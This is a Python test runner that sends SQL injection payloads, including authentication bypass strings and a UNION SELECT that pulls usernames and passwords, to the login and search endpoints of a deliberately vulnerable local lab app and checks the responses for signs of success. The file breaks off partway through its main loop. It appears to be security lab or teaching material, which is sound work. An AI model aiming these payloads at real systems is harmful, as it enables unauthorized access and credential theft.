# test_runner.py
"""
Simple test runner for SQLi Playground (vulnerable app).
- Tests /login (POST username/password) and /search?q=...
- Runs benign and malicious payloads from a small list
- Prints results and saves JSON report to test_report.json
"""

import requests
import json
import time
from textwrap import shorten

BASE = "http://127.0.0.1:5000"  # vulnerable app
TIMEOUT = 5

# Define tests: tuple(endpoint_type, endpoint_path, method)
TESTS = [
    ("login", "/login", "POST"),
    ("search", "/search", "GET"),
]

# Benign inputs
BENIGN = {
    "login": {"username": "alice", "password": "alicepass"},
    "search": {"q": "widget"}
}

# A short list of malicious payloads (do not include destructive payloads)
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin' --",
    "' UNION SELECT NULL, username, password FROM users --",
    "' OR 'x'='x",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
]

def pretty_snip(text, width=140):
    if text is None:
        return "<no response>"
    return shorten(text.replace("\n", " "), width=width, placeholder="...")

def run_login_payload(payload):
    url = BASE + "/login"
    data = {"username": payload, "password": "noop"}
    try:
        r = requests.post(url, data=data, timeout=TIMEOUT)
        return r.status_code, len(r.text), r.text
    except Exception as e:
        return None, None, f"EXC: {e}"

def run_search_payload(payload):
    url = BASE + "/search"
    params = {"q": payload}
    try:
        r = requests.get(url, params=params, timeout=TIMEOUT)
        return r.status_code, len(r.text), r.text
    except Exception as e:
        return None, None, f"EXC: {e}"

def run_benign_test(kind):
    if kind == "login":
        url = BASE + "/login"
        try:
            r = requests.post(url, data=BENIGN["login"], timeout=TIMEOUT)
            return r.status_code, len(r.text), r.text
        except Exception as e:
            return None, None, f"EXC: {e}"
    else:
        url = BASE + "/search"
        try:
            r = requests.get(url, params=BENIGN["search"], timeout=TIMEOUT)
            return r.status_code, len(r.text), r.text
        except Exception as e:
            return None, None, f"EXC: {e}"

def run_tests():
    results = {"meta": {"base": BASE, "time": time.ctime()}, "tests": []}

    # Baseline (benign)
    for kind, path, method in TESTS:
        status, rlen, text = run_benign_test(kind)
        results["tests"].append({
            "kind": kind,
            "path": path,
            "mode": "benign",
            "payload": None,
            "status": status,
            "resp_len": rlen,
            "snippet": pretty_snip(text, 200)
        })
        print(f"[BENIGN] {kind.upper():6} {path} -> status={status} len={rlen}")

    print("\n--- Running malicious payloads ---\n")
    for p in PAYLOADS:
        for kind, path, method in TESTS:
            if kind == "login":
                status, rlen, text = run_login_payload(p)
            else:
                status, rlen, text = run_search_payload(p)

            snippet = pretty_snip(text, 200)
            # Heuristic: if login returns status 200 with 'ok' or contains 'user' -> possible bypass
            evidence = []
            if text and ("ok" in text.lower() or "\"user\"" in text.lower()):
                evidence.append("possible_auth_bypass")
            # If DB error disclosed:
            if text and ("db error" in text.lower() or "sqlite3" in text.lower() or "operationalerror" in text.lower()):
                evidence.append("db_error_disclosed")
            # Large response length compared to benign (simple heuristic)
            # Get baseline len
            baseline_len = None
            for t in results["tests"]:
                if t["kind"] == kind and t["mode"] == "benign":
                    baseline_len = t["resp_len"]
                    break
            if baseline_len is not None and rlen is not None and abs(rlen - baseline_len) > max(50, baseline_len * 0.5):
                evidence.append("response_size_change")

            res = {
                "kind": kind,
                "path": path,
                "mode": "malicious",
                "payload": p,
                "status": status,
                "resp_len": rlen,
                "snippet": snippet,
                "evidence": evidence
            }
            results["tests"].append(res)
            # Print a friendly summary line
            evtag = ",".join(evidence) if evidence else "none"
